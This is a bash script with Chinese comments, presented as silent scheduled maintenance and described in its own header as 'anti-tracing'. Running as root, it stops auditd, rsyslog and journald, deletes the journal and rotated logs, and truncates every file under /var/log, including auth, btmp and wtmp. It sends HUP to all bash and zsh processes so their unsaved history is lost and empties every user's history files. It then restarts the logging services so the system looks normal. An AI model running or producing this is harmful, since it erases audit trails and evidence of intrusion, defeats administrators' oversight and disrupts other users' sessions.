#!/bin/bash
# =================================================================
# 专属定时维护版：全盘深度自洁与反溯源脚本 (无交互/静默运行)
# =================================================================

# 确保以 root 权限运行
if [ "$EUID" -ne 0 ]; then
  exit 1
fi

# 1. 临时停止系统审计与核心日志服务
systemctl stop auditd.service 2>/dev/null
systemctl stop syslog.service rsyslog.service 2>/dev/null
systemctl stop systemd-journald.service 2>/dev/null

# 2. 彻底抹除 systemd journal 二进制日志 (含物理磁盘与内存暂存)
rm -rf /run/log/journal/*
rm -rf /var/log/journal/*

# 3. 物理粉碎所有历史轮替的旧审计压缩包 (.gz / .1 / .log.X)
find /var/log -type f \( -name "*.gz" -o -name "*.1" -o -name "*.log.[0-9]" \) -delete 2>/dev/null

# 4. 全盘截断 /var/log 下的所有静态文本日志 (auth, btmp, wtmp 等全部归零)
find /var/log -type f -exec truncate -s 0 {} \;

# 5. 【核心无痕优化】强行刺破当前所有活跃 TTY 会话的内存历史缓存
# 遍历系统当前所有正在运行的 bash/zsh 进程，向它们发送 HUP 信号
# 这样可以强制让当前在线的用户丢弃内存中的 command history，不写入磁盘
pidof bash | xargs -I {} kill -HUP {} 2>/dev/null
pidof zsh | xargs -I {} kill -HUP {} 2>/dev/null

# 6. 遍历系统所有实际用户的家目录，彻底清空物理历史档案
USERS_HOMES=$(awk -F: '{print $6}' /etc/passwd)
for home in $USERS_HOMES; do
    for histfile in ".bash_history" ".zsh_history" ".sh_history" ".lesshst" ".nano_history"; do
        if [ -f "$home/$histfile" ]; then
            truncate -s 0 "$home/$histfile"
            # 顺便将其权限设为只读或尝试切断后续写入（可选：chmod 400）
        fi
    done
done

# 7. 清理可能残存的系统全局环境历史
truncate -s 0 /root/.bash_history 2>/dev/null
truncate -s 0 /root/.zsh_history 2>/dev/null

# 8. 恢复系统核心日志服务 (保持系统表面的正常运转)
systemctl start systemd-journald.service 2>/dev/null
systemctl start rsyslog.service 2>/dev/null
systemctl start auditd.service 2>/dev/null

exit 0
